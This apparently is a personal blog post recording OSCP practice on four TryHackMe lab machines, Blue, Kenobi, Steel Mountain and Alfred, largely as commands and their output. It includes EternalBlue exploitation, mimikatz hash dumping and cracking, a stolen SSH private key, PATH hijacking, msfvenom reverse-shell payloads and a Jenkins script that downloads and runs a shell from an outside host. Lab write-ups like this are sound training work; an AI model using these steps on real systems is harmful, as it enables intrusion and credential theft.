---
layout: post
title:  "OSCP Preparation Day Five"
date:   2020-07-18 20:05:48 +0100
categories: oscp
---

For today, as it is the last day before I start the PWK course, I will be doing boxes from the OSCP path on [tryhackme](https://tryhackme.com/)


## BLUE

### NMAP
```
nmap -T3 -sC -sV 10.10.75.5 --script=smb-vuln-*
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 11:56 BST
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.75.5
Host is up (0.091s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.45 seconds
```

### ETERNAL BLUE
This machine is vulnerable to the MS17-010 exploit EternalBlue. By using the metasploit module for this `windows/smb/ms17_010_eternalblue`. 

After running this module we will be given a shell as SYSTEM.
```
C:\Windows\system32>whoami

nt authority\system
```

### HASHDUMP
The challenge requests us to dump hashes through a meterpreter session, but it's just as easy to dump them through `mimikatz`.
```
mimikatz # lsadump::sam
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d

mimikatz # 
```

### CRACKING
Now we can crack the hashes we found to see what passwords the users were using.
```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status

alqfna22         (Jon)
```

## KENOBI

### NMAP
```
nmap -sC -sV 10.10.64.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 12:35 BST
Nmap scan report for 10.10.64.111
Host is up (0.091s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36641/tcp6  mountd
|   100005  1,2,3      50728/udp   mountd
|   100005  1,2,3      53792/udp6  mountd
|   100005  1,2,3      54569/tcp   mountd
|   100021  1,3,4      35973/tcp   nlockmgr
|   100021  1,3,4      37647/tcp6  nlockmgr
|   100021  1,3,4      39110/udp   nlockmgr
|   100021  1,3,4      42372/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### SMB
```
python3 /opt/smbmap/smbmap.py -H 10.10.64.111 -R anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.10.64.111:445	Name: 10.10.64.111        	Status: Guest session   	
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Wed Sep  4 11:49:09 2019	.
	dr--r--r--                0 Wed Sep  4 11:56:07 2019	..
	fr--r--r--            12237 Wed Sep  4 11:49:09 2019	log.txt
```
```
python3 /opt/smbmap/smbmap.py -H 10.10.64.111 -R anonymous --download anonymous/log.txt

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

[+] Starting download: anonymous\log.txt (12237 bytes)
[+] File output to: /home/corn/ctf/tryhackme/kenobi/10.10.64.111-anonymous_log.txt
```
Inside log.txt we see that ftp is running as user kenobi, and this user also created an ssh key.
```
cat 10.10.64.111-anonymous_log.txt 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

...

# Set the user and group under which the server will run.
User				kenobi
Group				kenobi
```
Also we can check showmount to see if there are any mountable directories since port 2049 is open.
```
showmount -e 10.10.64.111
Export list for 10.10.64.111:
/var *

sudo mount -t nfs 10.10.64.111:/var /mnt/smb
```
After mounting this filesystem, we can see that we have a writable directory on `/var/tmp`. 

Now using the ProFTP 1.3.5 mod_copy() exploit, we can copy the id_rsa file to /var/tmp and read it on our mounted share.
```
nc 10.10.64.111 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.64.111]

site cpfr /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
site cpto /var/tmp/id_rsa
250 Copy successful
```
```
cat /mnt/smb/tmp/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```
With this ssh key we can log in to the system as kenobi.

### PRIV ESC
```
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
...
/usr/bin/menu
...
```
After running strings on this strange binary, we see that it is running curl, uname and ifconfig without a full file path. 

Using this, we can write a program to our path and run it from the /usr/bin/menu binary (which is running as root from SUID, but still uses our PATH) and get a shell as root.

```
kenobi@kenobi:~/bin$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
We already have writable directories at the start of our path, but if we didn't we could do it manually with `export PATH=/home/kenobi/exploit:$PATH`.

```
kenobi@kenobi:~/bin$ cat curl; chmod +x curl
#!/bin/bash

bash
```
With our exploit set up, we can run it from the menu binary.
```
kenobi@kenobi:~/bin$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~/bin# cd /root
root@kenobi:/root# ls
root.txt
```

## STEEL MOUNTAIN

### NMAP
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 13:14 BST
Nmap scan report for 10.10.115.163
Host is up (0.091s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-07-18T12:16:04+00:00; -1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### REJETTO
This version of rejetto file system is vulnerable to a RCE exploit which can be found [here](https://www.exploit-db.com/raw/39161). 

To run the exploit, we will need to change the local IP address and port number for the listener we will run.
```
...
	ip_addr = "10.11.3.179" #local IP address
	local_port = "4444" # Local Port number
...
```
Now we can run the command `python exploit.py 10.10.115.163 8080` with a http server hosting `nc.exe` on port 80 and our nc listener running on port 4444, and we have a shell as bill.

### PRIV ESC

After running winpeas.exe on the machine we can see that there is a vulnerable service with an unquoted path:
```
  [+] Interesting Services -non Microsoft-(T1007)
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    Advanced SystemCare Service
   =================================================================================================

```
To exploit this we can upload a msfvenom payload `msfvenom -p windows/shell/reverse_tcp LHOST=10.11.3.179 LPORT=4444 -f exe > shell.exe` as `Advanced.exe` then stop and start the service to get a shell as SYSTEM.
```
C:\Program Files (x86)\IObit>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Program Files (x86)\IObit

09/26/2019  08:17 AM    <DIR>          .
09/26/2019  08:17 AM    <DIR>          ..
07/18/2020  05:13 AM    <DIR>          Advanced SystemCare
09/26/2019  10:35 PM    <DIR>          IObit Uninstaller
07/18/2020  05:14 AM    <DIR>          LiveUpdate
               0 File(s)              0 bytes
               5 Dir(s)  44,162,068,480 bytes free

C:\Program Files (x86)\IObit>copy \\10.11.3.179\corn\shell.exe Advanced.exe
copy \\10.11.3.179\corn\shell.exe Advanced.exe
        1 file(s) copied.


C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```
Now after starting the service again, we will have a shell on our listener as SYSTEM.
```
[*] Started reverse TCP handler on 10.11.3.179:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.115.163
[*] Command shell session 1 opened (10.11.3.179:4444 -> 10.10.115.163:49281) at 2020-07-18 13:26:14 +0100



C:\Windows\system32>whoami

nt authority\system
```

## ALFRED

### NMAP
```
Nmap scan report for 10.10.12.237
Host is up (0.054s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-07-18T12:46:20+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.37 seconds
```

### JENKINS
We can log into jenkins with the credentials `admin:admin` and perform RCE from entering commands into the the script box at `/script`.

The plan is to upload a msfvenom payload `msfvenom -p windows/shell/reverse_tcp LHOST=10.11.3.179 LPORT=4444 -f exe > shell.exe` and run it in 2 commands to get a shell on the box.
```
def command = """powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.1.63/shell.exe', 'C:/Windows/Tasks/shell.exe') """
def proc = command.execute()
proc.waitFor()

println "return code: ${ proc.exitValue()}"
println "stderr: ${proc.err.text}"
println "stdout: ${proc.in.text}"
```
```
def command = """C:/Windows/Tasks/shell.exe"""
def proc = command.execute()
proc.waitFor()

println "return code: ${ proc.exitValue()}"
println "stderr: ${proc.err.text}"
println "stdout: ${proc.in.text}"
```
```
C:\Program Files (x86)\Jenkins>whoami

alfred\bruce
```
### PRIV ESC

```
C:\Windows\Tasks>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeDebugPrivilege                Debug programs                            Enabled 
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
```
With these privileges we can do a multitude of things. For this box we will just use the impersonate privilege to get a shell as SYSTEM using `JuicyPotato`.

First we can get the Windows version from `systeminfo`.
```
C:\Windows\Tasks>systeminfo
systeminfo

Host Name:                 ALFRED
OS Name:                   Microsoft Windows 7 Ultimate
```
Next we can find a CLSID from the juicy potato [github](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise) and use it to impersonate SYSTEM.
```
C:\Windows\Tasks>C:\windows\tasks\juicy.exe -l 1337 -p C:\windows\tasks\shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```
After running we will have a shell on our listener.
```
C:\Windows\system32>whoami  

nt authority\system
```